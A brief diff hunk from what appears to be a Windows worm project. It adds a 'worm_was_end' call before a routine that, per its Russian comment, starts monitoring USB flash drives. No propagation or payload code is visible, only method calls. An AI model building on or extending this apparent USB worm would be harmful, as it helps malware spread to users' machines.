@@ -44,7 +44,7 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR lpCmdLin
 
 	//worm1.print_file_to_copy();
 
-	
+	worm1.worm_was_end();
 	return worm1.run_device_monitor(hInstance); // запуск мониторинга флешек
 	
 	
